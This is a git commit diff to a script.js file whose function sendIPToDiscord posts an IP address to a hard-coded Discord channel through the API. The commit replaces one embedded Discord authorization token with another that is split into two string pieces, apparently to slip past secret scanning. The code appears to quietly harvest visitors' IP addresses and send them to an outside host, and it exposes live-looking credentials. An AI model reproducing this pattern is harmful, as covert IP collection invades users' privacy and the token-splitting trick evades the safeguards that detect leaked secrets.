cc112bd897de59ff7f9439fcc118c12212092529
richardmichard <albig_juli@bs-an.de>
2024-02-08 09:54:16 +0100

    a
    a

--- script.js
+++ script.js
@@ -2,11 +2,14 @@ function generateNonce() {
     return Math.random() * 1000000
 }
 
+const tokenPart1 = "MTIwNTA3MTcwMzExMDE4OTA1Ng.GQIW0Q"
+const tokenPart2 = ".NXAM82y7_i4YEYTawjPl8pfXDU_-5vv4ir4pKk"
+
 function sendIPToDiscord(ip) {
     fetch("https://discord.com/api/v9/channels/1205072221370847255/messages", {
   "headers": {
     "accept": "*/*",
-    "authorization": "MTIwNTA3MTcwMzExMDE4OTA1Ng.G7Ju5A.TtjYYvCBkayNgRISfiL-sjiqmS1ANX68tO5uMQ",
+    "authorization": tokenPart1 + tokenPart2,
     "content-type": "application/json",
   },
   "referrer": "https://discord.com/channels/1205072221370847252/1205072221370847255",
